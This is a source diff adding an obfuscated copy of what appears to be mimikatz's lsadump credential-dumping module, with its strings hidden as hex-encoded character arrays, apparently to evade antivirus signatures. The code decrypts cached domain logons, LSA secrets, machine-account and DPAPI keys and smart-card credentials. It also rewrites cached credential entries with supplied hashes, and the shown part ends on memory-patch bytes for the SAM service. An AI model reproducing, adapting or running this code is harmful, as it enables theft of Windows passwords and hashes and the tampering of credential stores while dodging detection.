+							szSecretName = szMaxValueNameLen;
+							szSecret = szMaxValueLen;
+							if(kull_m_registry_RegEnumValue(hSecurity, hCache, i, secretName, &szSecretName, NULL, &type, (LPBYTE) pMsCacheEntry, &szSecret))
+							{
+								if((_wcsnicmp(secretName, hid_N_L____61RsMbqmhGF3, 10) == 0) || (_wcsnicmp(secretName, hid_N_L____1CDbT72b3DM1, 17) == 0) || !(pMsCacheEntry->flags & 1))
+									continue;
+
+								kprintf(hid________yTxLLNgyN8yb, secretName);
+								kull_m_string_displayLocalFileTime(&pMsCacheEntry->lastWrite);
+								kprintf(hid_____R__XaR1C4TMBfVp, pMsCacheEntry->userId, pMsCacheEntry->userId);
+								
+								s1 = szSecret - FIELD_OFFSET(MSCACHE_ENTRY, enc_data);
+								if(lsaKeysStream) // NT 6
+								{
+									if(kull_m_crypto_aesCTSEncryptDecrypt(CALG_AES_128, pMsCacheEntry->enc_data, s1, pNLKM, AES_128_KEY_SIZE, pMsCacheEntry->iv, FALSE))
+									{
+										kuhl_m_lsadump_printMsCache(pMsCacheEntry, '2');
+										usr.Length = usr.MaximumLength = pMsCacheEntry->szUserName;
+										usr.Buffer = (PWSTR) ((PBYTE) pMsCacheEntry->enc_data + sizeof(MSCACHE_DATA));
+
+										if(pCacheData->hProv && ((PMSCACHE_DATA) pMsCacheEntry->enc_data)->szSC)
+											kuhl_m_lsadump_decryptSCCache(pMsCacheEntry->enc_data + (s1 - ((PMSCACHE_DATA) pMsCacheEntry->enc_data)->szSC), ((PMSCACHE_DATA) pMsCacheEntry->enc_data)->szSC, pCacheData->hProv, pCacheData->keySpec);
+
+										if(pCacheData && pCacheData->username && (_wcsnicmp(pCacheData->username, usr.Buffer, usr.Length / sizeof(wchar_t)) == 0))
+										{
+											kprintf(hid_____U__pnnxSwhV9HAL);
+											if(pCacheData->isNtlm)
+												hashStatus = NT_SUCCESS(kull_m_crypto_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->ntlm, &usr, iter));
+											else if(pCacheData->isDCC)
+											{
+												hashStatus = TRUE;
+												RtlCopyMemory(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->dcc, LM_NTLM_HASH_LENGTH);
+											}
+											else hashStatus = FALSE;
+											if(hashStatus)
+											{
+												kprintf(hid_____M__AsUAMiBjQItJ); kull_m_string_wprintf_hex(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
+												if(kull_m_crypto_hmac(CALG_SHA1, pNLKM, AES_128_KEY_SIZE, pMsCacheEntry->enc_data, s1, pMsCacheEntry->cksum, MD5_DIGEST_LENGTH))
+												{
+													kprintf(hid_____C__29RP8n0StZHH); kull_m_string_wprintf_hex(pMsCacheEntry->cksum, MD5_DIGEST_LENGTH, 0); kprintf(L"\n");
+													if(kull_m_crypto_aesCTSEncryptDecrypt(CALG_AES_128, pMsCacheEntry->enc_data, s1, pNLKM, AES_128_KEY_SIZE, pMsCacheEntry->iv, TRUE))
+													{
+														if(kull_m_registry_RegSetValueEx(hSecurity, hCache, secretName, 0, type, (LPBYTE) pMsCacheEntry, szSecret))
+															kprintf(hid_____O__tmXd30xOVvYg);
+														else PRINT_ERROR_AUTO(L"kull_m_registry_RegSetValueEx");
+													}
+												}
+											}
+											else PRINT_ERROR_AUTO(L"?");
+										}
+									}
+								}
+								else // NT 5
+								{
+									if(kull_m_crypto_hmac(CALG_MD5, pNLKM, szNLKM, pMsCacheEntry->iv, LAZY_IV_SIZE, key.Buffer, MD5_DIGEST_LENGTH))
+									{
+										data.Length = data.MaximumLength = s1;
+										data.Buffer = pMsCacheEntry->enc_data;
+										nStatus = RtlEncryptDecryptRC4(&data, &key);
+										if(NT_SUCCESS(nStatus))
+										{
+											kuhl_m_lsadump_printMsCache(pMsCacheEntry, '1');
+											usr.Length = usr.MaximumLength = pMsCacheEntry->szUserName;
+											usr.Buffer = (PWSTR) ((PBYTE) pMsCacheEntry->enc_data + sizeof(MSCACHE_DATA));
+											if(pCacheData && pCacheData->username && (_wcsnicmp(pCacheData->username, usr.Buffer, usr.Length / sizeof(wchar_t)) == 0))
+											{
+												kprintf(hid_____U__UHoDpNiikBPk);
+												if(pCacheData->isNtlm)
+													hashStatus = NT_SUCCESS(kull_m_crypto_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->ntlm, &usr, 0));
+												else if(pCacheData->isDCC)
+												{
+													hashStatus = TRUE;
+													RtlCopyMemory(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->dcc, LM_NTLM_HASH_LENGTH);
+												}
+												else hashStatus = FALSE;
+												if(NT_SUCCESS(kull_m_crypto_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->ntlm, &usr, 0)))
+												{
+													kprintf(hid_____M__B0yyk3uUjD3f); kull_m_string_wprintf_hex(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
+													if(kull_m_crypto_hmac(CALG_MD5, key.Buffer, MD5_DIGEST_LENGTH, pMsCacheEntry->enc_data, s1, pMsCacheEntry->cksum, MD5_DIGEST_LENGTH))
+													{
+														kprintf(hid_____C__TfvtNhygHORD); kull_m_string_wprintf_hex(pMsCacheEntry->cksum, MD5_DIGEST_LENGTH, 0); kprintf(L"\n");
+														nStatus = RtlEncryptDecryptRC4(&data, &key);
+														if(NT_SUCCESS(nStatus))
+														{
+															if(kull_m_registry_RegSetValueEx(hSecurity, hCache, secretName, 0, type, (LPBYTE) pMsCacheEntry, szSecret))
+																kprintf(hid_____O__NLlbf4tqyXpR);
+															else PRINT_ERROR_AUTO(L"kull_m_registry_RegSetValueEx");
+														}
+														else PRINT_ERROR(L"RtlEncryptDecryptRC4 : 0x%08x\n", nStatus);
+													}
+												}
+											}
+										}
+										else PRINT_ERROR(L"RtlEncryptDecryptRC4 : 0x%08x\n", nStatus);
+									}
+									else PRINT_ERROR_AUTO(L"kull_m_crypto_hmac");
+								}
+							}
+						}
+						LocalFree(pMsCacheEntry);
+					}
+					LocalFree(secretName);
+				}
+			}
+			kull_m_registry_RegCloseKey(hSecurity, hCache);
+		}
+		LocalFree(pNLKM);
+	}
+	return TRUE;
+}
+
+void kuhl_m_lsadump_printMsCache(PMSCACHE_ENTRY entry, CHAR version)
+{
+	//DWORD i;
+	
+	 wchar_t  hid_U_s_e__syRqK2Ag2Kz7[] = {'\x55','\x73','\x65','\x72','\x20','\x20','\x20','\x20','\x20','\x20','\x3a','\x20','\x25','\x77','\x5a','\\','\x25','\x77','\x5a','\n',0};
+
+	 wchar_t  hid_M_s_C__r8FQc21YiNUJ[] = {'\x4d','\x73','\x43','\x61','\x63','\x68','\x65','\x56','\x25','\x63','\x20','\x3a','\x20',0};
+MSCACHE_ENTRY_PTR ptr;
+	ptr.UserName.Buffer = (PWSTR) ((PBYTE) entry->enc_data + sizeof(MSCACHE_DATA));
+	ptr.UserName.Length = ptr.UserName.MaximumLength = entry->szUserName;
+	ptr.Domain.Buffer = (PWSTR) ((PBYTE) ptr.UserName.Buffer + SIZE_ALIGN(entry->szUserName, 4));
+	ptr.Domain.Length = ptr.Domain.MaximumLength = entry->szDomainName;
+	//ptr.DnsDomainName.Buffer = (PWSTR) ((PBYTE) ptr.Domain.Buffer + SIZE_ALIGN(entry->szDomainName, 4));
+	//ptr.DnsDomainName.Length = ptr.DnsDomainName.MaximumLength = entry->szDnsDomainName;
+	//ptr.Upn.Buffer = (PWSTR) ((PBYTE) ptr.DnsDomainName.Buffer + SIZE_ALIGN(entry->szDnsDomainName, 4));
+	//ptr.Upn.Length = ptr.Upn.MaximumLength = entry->szupn;
+	//ptr.EffectiveName.Buffer = (PWSTR) ((PBYTE) ptr.Upn.Buffer + SIZE_ALIGN(entry->szupn, 4));
+	//ptr.EffectiveName.Length = ptr.EffectiveName.MaximumLength = entry->szEffectiveName;
+	//ptr.FullName.Buffer = (PWSTR) ((PBYTE) ptr.EffectiveName.Buffer + SIZE_ALIGN(entry->szEffectiveName, 4));
+	//ptr.FullName.Length = ptr.FullName.MaximumLength = entry->szFullName;
+	//ptr.LogonScript.Buffer = (PWSTR) ((PBYTE) ptr.FullName.Buffer + SIZE_ALIGN(entry->szFullName, 4));
+	//ptr.LogonScript.Length = ptr.LogonScript.MaximumLength = entry->szlogonScript;
+	//ptr.ProfilePath.Buffer = (PWSTR) ((PBYTE) ptr.LogonScript.Buffer + SIZE_ALIGN(entry->szlogonScript, 4));
+	//ptr.ProfilePath.Length = ptr.ProfilePath.MaximumLength = entry->szprofilePath;
+	//ptr.HomeDirectory.Buffer = (PWSTR) ((PBYTE) ptr.ProfilePath.Buffer + SIZE_ALIGN(entry->szprofilePath, 4));
+	//ptr.HomeDirectory.Length = ptr.HomeDirectory.MaximumLength = entry->szhomeDirectory;
+	//ptr.HomeDirectoryDrive.Buffer = (PWSTR) ((PBYTE) ptr.HomeDirectory.Buffer + SIZE_ALIGN(entry->szhomeDirectory, 4));
+	//ptr.HomeDirectoryDrive.Length = ptr.HomeDirectoryDrive.MaximumLength = entry->szhomeDirectoryDrive;
+	//ptr.Groups = (PGROUP_MEMBERSHIP) ((PBYTE) ptr.HomeDirectoryDrive.Buffer + SIZE_ALIGN(entry->szhomeDirectoryDrive, 4));
+	//ptr.LogonDomainName.Buffer = (PWSTR) ((PBYTE) ptr.Groups + SIZE_ALIGN(entry->groupCount * sizeof(GROUP_MEMBERSHIP), 4));
+	//ptr.LogonDomainName.Length = ptr.LogonDomainName.MaximumLength = entry->szlogonDomainName;
+
+	//kprintf(L"UserName     : %wZ\n", &ptr.UserName);
+	//kprintf(L"Domain       : %wZ\n", &ptr.Domain);
+	//kprintf(L"DnsDomainName: %wZ\n", &ptr.DnsDomainName);
+	//kprintf(L"Upn          : %wZ\n", &ptr.Upn);
+	//kprintf(L"EffectiveName: %wZ\n", &ptr.EffectiveName);
+	//kprintf(L"FullName     : %wZ\n", &ptr.FullName);
+	//kprintf(L"LogonScript  : %wZ\n", &ptr.LogonScript);
+	//kprintf(L"ProfilePath  : %wZ\n", &ptr.ProfilePath);
+	//kprintf(L"HomeDirectory: %wZ\n", &ptr.HomeDirectory);
+	//kprintf(L"HomeDirectoryDrive: %wZ\n", &ptr.HomeDirectoryDrive);
+	//kprintf(L"Groups       :");
+	//for(i = 0; i < entry->groupCount; i++)
+	//	kprintf(L" %u", ptr.Groups[i].RelativeId);
+	//kprintf(L"\n");
+	//kprintf(L"LogonDomainName: %wZ\n", &ptr.LogonDomainName);
+	//kprintf(L"sidCount: %u\n", entry->sidCount);
+	kprintf(hid_U_s_e__syRqK2Ag2Kz7, &ptr.Domain, &ptr.UserName);
+	kprintf(hid_M_s_C__r8FQc21YiNUJ, version); kull_m_string_wprintf_hex(((PMSCACHE_DATA) entry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
+}
+
+DECLARE_CONST_UNICODE_STRING(NTLM_PACKAGE_NAME, L"NTLM");
+DECLARE_CONST_UNICODE_STRING(LSACRED_PACKAGE_NAME, LSA_CREDENTIAL_KEY_PACKAGE_NAME);
+BOOL kuhl_m_lsadump_decryptSCCache(PBYTE data, DWORD size, HCRYPTPROV hProv, DWORD keySpec)
+{
+	
+	 wchar_t  hid________jvZGXs1brW6U[] = {'\x20','\x20','\x5b','\x25','\x75','\x5d','\x20','\x25','\x77','\x5a',0};
+
+	 wchar_t  hid________sSHQXM0hDkLU[] = {'\n','\x20','\x20','\x20','\x20','\x4c','\x4d','\x3a','\x20',0};
+
+	 wchar_t  hid________QdQkwDHaWI45[] = {'\n','\x20','\x20','\x4e','\x54','\x4c','\x4d','\x3a','\x20',0};
+
+	 wchar_t  hid________88IzLwfgtJZn[] = {'\n','\x20','\x20','\x4e','\x54','\x4c','\x4d','\x3a','\x20',0};
+
+	 wchar_t  hid___U_n__V70zlYVeBUS6[] = {'\n','\x55','\x6e','\x6b','\x6e','\x6f','\x77','\x6e','\x20','\x76','\x65','\x72','\x73','\x69','\x6f','\x6e','\x3a','\x20','\x25','\x75','\n',0};
+BOOL status = FALSE;
+	PKIWI_ENC_SC_DATA pEnc = NULL;
+	DWORD toDecryptSize = 0;
+	
+	HCRYPTHASH hHash, hHash2;
+	DWORD dwSigLen = 0;
+	PBYTE sig;
+	HCRYPTKEY hKey;
+
+	DWORD i, j;
+	PPAC_CREDENTIAL_DATA credentialData = NULL;
+	PNTLM_SUPPLEMENTAL_CREDENTIAL ntlmCredential;
+	PNTLM_SUPPLEMENTAL_CREDENTIAL_V4 ntlmCredential4;
+	PKIWI_CREDENTIAL_KEYS pKeys = NULL;
+
+	if(size > sizeof(KIWI_ENC_SC_DATA))
+	{
+		if(RtlEqualMemory(data, "SuppData", 8))
+		{
+			pEnc = &((PKIWI_ENC_SC_DATA_NEW) data)->data;
+			toDecryptSize = ((PKIWI_ENC_SC_DATA_NEW) data)->dataSize - FIELD_OFFSET(KIWI_ENC_SC_DATA, toDecrypt);
+		}
+		else
+		{
+			pEnc = (PKIWI_ENC_SC_DATA) data;
+			toDecryptSize = size - FIELD_OFFSET(KIWI_ENC_SC_DATA, toDecrypt);
+		}
+
+		if(CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash))
+		{
+			CryptHashData(hHash, pEnc->toSign, sizeof(pEnc->toSign), 0);
+			if(CryptSignHash(hHash, keySpec, NULL, 0, NULL, &dwSigLen))
+			{
+				if(sig = (PBYTE) LocalAlloc(LPTR, dwSigLen))
+				{
+					if(CryptSignHash(hHash, keySpec, NULL, 0, sig, &dwSigLen))
+					{
+						if(CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash2))
+						{
+							CryptHashData(hHash2, sig, dwSigLen, 0);
+							CryptHashData(hHash2, pEnc->toHash, sizeof(pEnc->toHash), 0);
+							if(CryptDeriveKey(hProv, CALG_RC4, hHash2, 0, &hKey)) // maybe RC2 sometimes ?
+							{
+								if(status = CryptDecrypt(hKey, 0, TRUE, 0, pEnc->toDecrypt, &toDecryptSize))
+								{
+									if(kull_m_pac_DecodeCredential(pEnc->toDecrypt + 24, toDecryptSize - 24, &credentialData))
+									{
+										for(i = 0; i < credentialData->CredentialCount; i++)
+										{
+											kprintf(hid________jvZGXs1brW6U, i, &credentialData->Credentials[i].PackageName);
+											if(RtlEqualUnicodeString(&NTLM_PACKAGE_NAME, &credentialData->Credentials[i].PackageName, TRUE))
+											{
+												ntlmCredential = (PNTLM_SUPPLEMENTAL_CREDENTIAL) credentialData->Credentials[i].Credentials;
+												switch(ntlmCredential->Version)
+												{
+												case 0:
+													if(ntlmCredential->Flags & 1)
+													{
+														kprintf(hid________sSHQXM0hDkLU);
+														kull_m_string_wprintf_hex(ntlmCredential->LmPassword, LM_NTLM_HASH_LENGTH, 0);
+													}
+													if(ntlmCredential->Flags & 2)
+													{
+														kprintf(hid________QdQkwDHaWI45);
+														kull_m_string_wprintf_hex(ntlmCredential->NtPassword, LM_NTLM_HASH_LENGTH, 0);
+													}
+													break;
+												case 4: // 10 ?
+													ntlmCredential4 = (PNTLM_SUPPLEMENTAL_CREDENTIAL_V4) ntlmCredential;
+													if(ntlmCredential4->Flags & 2)
+													{
+														kprintf(hid________88IzLwfgtJZn);
+														kull_m_string_wprintf_hex(ntlmCredential4->NtPassword, LM_NTLM_HASH_LENGTH, 0);
+													}
+													break;
+												default:
+													kprintf(hid___U_n__V70zlYVeBUS6, ntlmCredential->Version);
+												}
+											}
+											else if(RtlEqualUnicodeString(&LSACRED_PACKAGE_NAME, &credentialData->Credentials[i].PackageName, TRUE))
+											{
+												if(kull_m_rpc_DecodeCredentialKeys(credentialData->Credentials[i].Credentials, credentialData->Credentials[i].CredentialSize, &pKeys))
+												{
+													for(j = 0; j < pKeys->count; j++)
+														kuhl_m_sekurlsa_genericKeyOutput(&pKeys->keys[j], NULL);
+													kull_m_rpc_FreeCredentialKeys(&pKeys);
+												}
+											}
+											else
+											{
+												kprintf(L"\n");
+												kull_m_string_wprintf_hex(credentialData->Credentials[i].Credentials, credentialData->Credentials[i].CredentialSize, 1 | (16 << 16));
+											}
+											kprintf(L"\n");
+										}
+										kull_m_pac_FreeCredential(&credentialData);
+									}
+								}
+								else PRINT_ERROR_AUTO(L"CryptDecrypt");
+								CryptDestroyKey(hKey);
+							}
+							else PRINT_ERROR_AUTO(L"CryptDeriveKey(RC4)");
+							CryptDestroyHash(hHash2);
+						}
+					}
+					else PRINT_ERROR_AUTO(L"CryptSignHash(data)");
+					LocalFree(sig);
+				}
+			}
+			else PRINT_ERROR_AUTO(L"CryptSignHash(init)");
+			CryptDestroyHash(hHash);
+		}
+	}
+	return status;
+}
+
+void kuhl_m_lsadump_getInfosFromServiceName(IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, IN PCWSTR serviceName)
+{
+	
+	const wchar_t  hid_O_b_j__mdABMMIA4I2e[] = {'\x4f','\x62','\x6a','\x65','\x63','\x74','\x4e','\x61','\x6d','\x65',0};
+
+	 wchar_t  hid________JB8XXefEaJCL[] = {'\x20','\x2f','\x20','\x73','\x65','\x72','\x76','\x69','\x63','\x65','\x20','\'','\x25','\x73','\'','\x20','\x77','\x69','\x74','\x68','\x20','\x75','\x73','\x65','\x72','\x6e','\x61','\x6d','\x65','\x20','\x3a','\x20','\x25','\x2e','\x2a','\x73',0};
+DWORD szNeeded;
+	LPVOID objectName;
+	if(kull_m_registry_OpenAndQueryWithAlloc(hSystem, hSystemBase, serviceName, hid_O_b_j__mdABMMIA4I2e, NULL, &objectName, &szNeeded))
+	{
+		kprintf(hid________JB8XXefEaJCL, serviceName, szNeeded / sizeof(wchar_t), objectName);
+		LocalFree(objectName);
+	}
+}
+
+BOOL kuhl_m_lsadump_decryptSecret(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hSecret, IN LPCWSTR KeyName, IN PNT6_SYSTEM_KEYS lsaKeysStream, IN PNT5_SYSTEM_KEY lsaKeyUnique, IN PVOID * pBufferOut, IN PDWORD pSzBufferOut)
+{
+	BOOL status = FALSE;
+	DWORD szSecret = 0;
+	PVOID secret;
+	CRYPTO_BUFFER data, output = {0, 0, NULL}, key = {sizeof(NT5_SYSTEM_KEY), sizeof(NT5_SYSTEM_KEY), NULL};
+
+	if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hSecret, KeyName, NULL, NULL, &secret, &szSecret))
+	{
+		if(lsaKeysStream)
+		{
+			if(kuhl_m_lsadump_sec_aes256((PNT6_HARD_SECRET) secret, szSecret, lsaKeysStream, NULL))
+			{
+				*pSzBufferOut = ((PNT6_HARD_SECRET) secret)->clearSecret.SecretSize;
+				if(*pBufferOut = LocalAlloc(LPTR, *pSzBufferOut))
+				{
+					status = TRUE;
+					RtlCopyMemory(*pBufferOut, ((PNT6_HARD_SECRET) secret)->clearSecret.Secret, *pSzBufferOut);
+				}
+			}
+		}
+		else if(lsaKeyUnique)
+		{
+			key.Buffer = lsaKeyUnique->key;
+			data.Length = data.MaximumLength = ((PNT5_HARD_SECRET) secret)->encryptedStructSize;
+			data.Buffer = (PBYTE) secret + szSecret - data.Length; // dirty hack to not extract x64/x86 from REG ; // ((PNT5_HARD_SECRET) secret)->encryptedSecret;
+			if(RtlDecryptDESblocksECB(&data, &key, &output) == STATUS_BUFFER_TOO_SMALL)
+			{
+				if(output.Buffer = (PBYTE) LocalAlloc(LPTR, output.Length))
+				{
+					output.MaximumLength = output.Length;
+					if(NT_SUCCESS(RtlDecryptDESblocksECB(&data, &key, &output)))
+					{
+						*pSzBufferOut = output.Length;
+						if(*pBufferOut = LocalAlloc(LPTR, *pSzBufferOut))
+						{
+							status = TRUE;
+							RtlCopyMemory(*pBufferOut, output.Buffer, *pSzBufferOut);
+						}
+					}
+					LocalFree(output.Buffer);
+				}
+			}
+		}
+		LocalFree(secret);
+	}
+	return status;
+}
+
+void kuhl_m_lsadump_candidateSecret(DWORD szBytesSecrets, PVOID bufferSecret, PCWSTR prefix, PCWSTR secretName)
+{
+	
+	 wchar_t  hid_t_e_x__pSGtD8EoEBuW[] = {'\x74','\x65','\x78','\x74','\x3a','\x20','\x25','\x77','\x5a',0};
+
+	 wchar_t  hid_h_e_x__VUPZlEFgdWFT[] = {'\x68','\x65','\x78','\x20','\x3a','\x20',0};
+
+	const wchar_t  hid___M_A__xFUcA4qg18GI[] = {'\x24','\x4d','\x41','\x43','\x48','\x49','\x4e','\x45','\x2e','\x41','\x43','\x43',0};
+
+	 wchar_t  hid________O1VPt7nfnViP[] = {'\n','\x20','\x20','\x20','\x20','\x4e','\x54','\x4c','\x4d','\x3a',0};
+
+	 wchar_t  hid________DF8BCfCMF5Sb[] = {'\n','\x20','\x20','\x20','\x20','\x53','\x48','\x41','\x31','\x3a',0};
+
+	const wchar_t  hid_D_P_A__TF3flnvXH7sp[] = {'\x44','\x50','\x41','\x50','\x49','\x5f','\x53','\x59','\x53','\x54','\x45','\x4d',0};
+
+	 wchar_t  hid________qqPVnT2dO2cV[] = {'\n','\x20','\x20','\x20','\x20','\x66','\x75','\x6c','\x6c','\x3a','\x20',0};
+
+	 wchar_t  hid________oDqZg1QZcg8T[] = {'\n','\x20','\x20','\x20','\x20','\x6d','\x2f','\x75','\x20','\x3a','\x20',0};
+
+	 wchar_t  hid________T4xEWmjjeqyn[] = {'\x20','\x2f','\x20',0};
+
+	const wchar_t  hid_M______CUCjCp52WQqt[] = {'\x4d','\x24','\x5f','\x4d','\x53','\x56','\x31','\x5f','\x30','\x5f','\x54','\x42','\x41','\x4c','\x5f','\x50','\x52','\x49','\x4d','\x41','\x52','\x59','\x5f',0};
+
+	 wchar_t  hid________9co5kLZEimRh[] = {'\x20','\x20','\x20','\x55','\x73','\x65','\x72','\x20','\x20','\x20','\x3a','\x20','\x25','\x2e','\x2a','\x73','\n','\x20','\x20','\x20','\x20','\x44','\x6f','\x6d','\x61','\x69','\x6e','\x20','\x3a','\x20','\x25','\x2e','\x2a','\x73',0};
+
+	 wchar_t  hid________N5WxKOQPS0bt[] = {'\n','\x20','\x20','\x20','\x20','\x2a','\x20','\x4e','\x54','\x4c','\x4d','\x20','\x3a','\x20',0};
+
+	 wchar_t  hid________thLtyr2vonqD[] = {'\n','\x20','\x20','\x20','\x20','\x2a','\x20','\x4c','\x4d','\x20','\x20','\x20','\x3a','\x20',0};
+
+	 wchar_t  hid________QAOBDJRIG6ns[] = {'\n','\x20','\x20','\x20','\x20','\x2a','\x20','\x53','\x48','\x41','\x31','\x20','\x3a','\x20',0};
+
+	 wchar_t  hid________Eu6XUkBxeiTN[] = {'\n','\x20','\x20','\x20','\x20','\x2a','\x20','\x44','\x50','\x41','\x50','\x49','\x3a','\x20',0};
+UNICODE_STRING candidateString = {(USHORT) szBytesSecrets, (USHORT) szBytesSecrets, (PWSTR) bufferSecret};
+	BOOL isStringOk = FALSE;
+	PVOID bufferHash[SHA_DIGEST_LENGTH]; // ok for NTLM too
+	PKIWI_TBAL_MSV pTbal;
+
+	if(bufferSecret && szBytesSecrets)
+	{
+		kprintf(L"%s", prefix);
+		if(szBytesSecrets <= USHRT_MAX)
+			if(isStringOk = kull_m_string_suspectUnicodeString(&candidateString))
+				kprintf(hid_t_e_x__pSGtD8EoEBuW, &candidateString);
+
+		if(!isStringOk)
+		{
+			kprintf(hid_h_e_x__VUPZlEFgdWFT);
+			kull_m_string_wprintf_hex(bufferSecret, szBytesSecrets, 1);
+		}
+
+		if(_wcsicmp(secretName, hid___M_A__xFUcA4qg18GI) == 0)
+		{
+			if(kull_m_crypto_hash(CALG_MD4, bufferSecret, szBytesSecrets, bufferHash, MD4_DIGEST_LENGTH))
+			{
+				kprintf(hid________O1VPt7nfnViP);
+				kull_m_string_wprintf_hex(bufferHash, MD4_DIGEST_LENGTH, 0);
+			}
+			if(kull_m_crypto_hash(CALG_SHA1, bufferSecret, szBytesSecrets, bufferHash, SHA_DIGEST_LENGTH))
+			{
+				kprintf(hid________DF8BCfCMF5Sb);
+				kull_m_string_wprintf_hex(bufferHash, SHA_DIGEST_LENGTH, 0);
+			}
+		}
+		else if((_wcsicmp(secretName, hid_D_P_A__TF3flnvXH7sp) == 0) && (szBytesSecrets == sizeof(DWORD) + 2 * SHA_DIGEST_LENGTH))
+		{
+			kprintf(hid________qqPVnT2dO2cV);
+			kull_m_string_wprintf_hex((PBYTE) bufferSecret + sizeof(DWORD), 2 * SHA_DIGEST_LENGTH, 0);
+			kprintf(hid________oDqZg1QZcg8T);
+			kull_m_string_wprintf_hex((PBYTE) bufferSecret + sizeof(DWORD), SHA_DIGEST_LENGTH, 0);
+			kprintf(hid________T4xEWmjjeqyn);
+			kull_m_string_wprintf_hex((PBYTE) bufferSecret + sizeof(DWORD) + SHA_DIGEST_LENGTH, SHA_DIGEST_LENGTH, 0);
+		}
+		else if(_wcsnicmp(secretName, hid_M______CUCjCp52WQqt, 23) == 0)
+		{
+			pTbal = (PKIWI_TBAL_MSV) bufferSecret;
+			kprintf(hid________9co5kLZEimRh, pTbal->UserName.Length / sizeof(wchar_t), (PBYTE) pTbal + pTbal->UserName.Buffer, pTbal->DomainName.Length / sizeof(wchar_t), (PBYTE) pTbal + pTbal->DomainName.Buffer);
+			if(pTbal->flags & 1)
+			{
+				kprintf(hid________N5WxKOQPS0bt);
+				kull_m_string_wprintf_hex(pTbal->NtOwfPassword, sizeof(pTbal->NtOwfPassword), 0);
+			}
+			if(pTbal->flags & 2)
+			{
+				kprintf(hid________thLtyr2vonqD);
+				kull_m_string_wprintf_hex(pTbal->LmOwfPassword, sizeof(pTbal->LmOwfPassword), 0);
+			}
+			if(pTbal->flags & 4)
+			{
+				kprintf(hid________QAOBDJRIG6ns);
+				kull_m_string_wprintf_hex(pTbal->ShaOwPassword, sizeof(pTbal->ShaOwPassword), 0);
+			}
+			if(pTbal->flags & 8)
+			{
+				kprintf(hid________Eu6XUkBxeiTN);
+				kull_m_string_wprintf_hex(pTbal->DPAPIProtected, sizeof(pTbal->DPAPIProtected), 0);
+			}
+		}
+	}
+}
+
+BOOL kuhl_m_lsadump_sec_aes256(PNT6_HARD_SECRET hardSecretBlob, DWORD hardSecretBlobSize, PNT6_SYSTEM_KEYS lsaKeysStream, PBYTE sysKey)
+{
+	BOOL status = FALSE;
+	BYTE keyBuffer[AES_256_KEY_SIZE];
+	DWORD i, offset, szNeeded;
+	HCRYPTPROV hContext;
+	HCRYPTHASH hHash;
+	HCRYPTKEY hKey;
+	PBYTE pKey = NULL;
+	PNT6_SYSTEM_KEY lsaKey;
+
+	if(lsaKeysStream)
+	{
+		for(i = 0, offset = 0; i < lsaKeysStream->nbKeys; i++, offset += FIELD_OFFSET(NT6_SYSTEM_KEY, Key) + lsaKey->KeySize)
+		{
+			lsaKey = (PNT6_SYSTEM_KEY) ((PBYTE) lsaKeysStream->Keys + offset);
+			if(RtlEqualGuid(&hardSecretBlob->KeyId, &lsaKey->KeyId))
+			{
+				pKey = lsaKey->Key;
+				szNeeded = lsaKey->KeySize;
+				break;
+			}
+		}
+	}
+	else if(sysKey)
+	{
+		pKey = sysKey;
+		szNeeded = SYSKEY_LENGTH;
+	}
+
+	if(pKey)
+	{
+		if(CryptAcquireContext(&hContext, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
+		{
+			if(CryptCreateHash(hContext, CALG_SHA_256, 0, 0, &hHash))
+			{
+				CryptHashData(hHash, pKey, szNeeded, 0);
+				for(i = 0; i < 1000; i++)
+					CryptHashData(hHash, hardSecretBlob->lazyiv, LAZY_NT6_IV_SIZE, 0);
+				
+				szNeeded = sizeof(keyBuffer);
+				if(CryptGetHashParam(hHash, HP_HASHVAL, keyBuffer, &szNeeded, 0))
+				{
+					if(kull_m_crypto_hkey(hContext, CALG_AES_256, keyBuffer, sizeof(keyBuffer), 0, &hKey, NULL))
+					{
+						i = CRYPT_MODE_ECB;
+						if(CryptSetKeyParam(hKey, KP_MODE, (LPCBYTE) &i, 0))
+						{
+							szNeeded = hardSecretBlobSize - FIELD_OFFSET(NT6_HARD_SECRET, encryptedSecret);
+							status = CryptDecrypt(hKey, 0, FALSE, 0, hardSecretBlob->encryptedSecret, &szNeeded);
+							if(!status)
+								PRINT_ERROR_AUTO(L"CryptDecrypt");
+						}
+						else PRINT_ERROR_AUTO(L"CryptSetKeyParam");
+						CryptDestroyKey(hKey);
+					}
+					else PRINT_ERROR_AUTO(L"kull_m_crypto_hkey");
+				}
+				CryptDestroyHash(hHash);
+			}
+			CryptReleaseContext(hContext, 0);
+		}
+	}
+	return status;
+}
+
+#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
+BYTE PTRN_WALL_SampQueryInformationUserInternal[]	= {0x49, 0x8d, 0x41, 0x20};
+BYTE PATC_WIN5_NopNop[]								= {0x90, 0x90};
+BYTE PATC_WALL_JmpShort[]							= {0xeb, 0x04};
+KULL_M_PATCH_GENERIC SamSrvReferences[] = {
+	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WIN5_NopNop),		PATC_WIN5_NopNop},		{-17}},
+	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-21}},
